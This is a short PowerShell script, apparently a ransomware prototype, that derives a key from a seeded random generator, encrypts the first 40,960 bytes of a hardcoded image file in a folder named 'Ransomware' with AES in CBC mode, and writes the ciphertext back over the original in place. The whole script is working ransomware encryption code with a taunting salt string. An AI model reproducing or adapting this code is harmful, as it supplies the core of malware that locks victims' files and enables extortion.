function EncryptFile($fileBytes, $key, $salt, $IV ){   
	$encryptorService = new-Object System.Security.Cryptography.RijndaelManaged;      
	$keyBytes = [Text.Encoding]::UTF8.GetBytes($key);   
	$saltBytes = [Text.Encoding]::UTF8.GetBytes($salt);   
	$encryptorService.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $keyBytes, $saltBytes, "SHA1", 5).GetBytes(32);   
	$encryptorService.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($IV) )[0..15];   
	$encryptorService.Padding="Zeros";  
	$encryptorService.Mode="CBC";  
	$encryptor = $encryptorService.CreateEncryptor();   
	$memStream = new-Object IO.MemoryStream;   
	$cryptoStream = new-Object Security.Cryptography.CryptoStream $memStream, $encryptor, "Write";  
	$cryptoStream.Write($fileBytes, 0, $fileBytes.Length);  
	$cryptoStream.Close();  
	$memStream.Close();   
	$encryptorService.Clear();   
	return $memStream.ToArray(); 
}

$key = (get-random -SetSeed 1 -count 50 -input (48..57 + 65..90 + 97..122) | foreach-object -begin { $pass = $null; } -process {$pass += [char]$_;} -end {$pass});      
Write-Output $key
$salt="DREAM hacks you!";  
$IV="DREAM INIT";  
$file=[io.file]::Open('C:\Users\Francesco\Desktop\Ransomware\Utils\original.jpeg', 'Open', 'ReadWrite');     
$bytesToEncrypt="40960";   
[byte[]]$fileBytes = new-object byte[] $bytesToEncrypt;   
$readFile = $file.Read($fileBytes, 0, $fileBytes.Length);       
$file.Position='0';       
$encryptedBytes = EncryptFile $fileBytes $key $salt $IV;
$file.Write($encryptedBytes, 0, $encryptedBytes.Length);   
$file.Close(); 
exit 0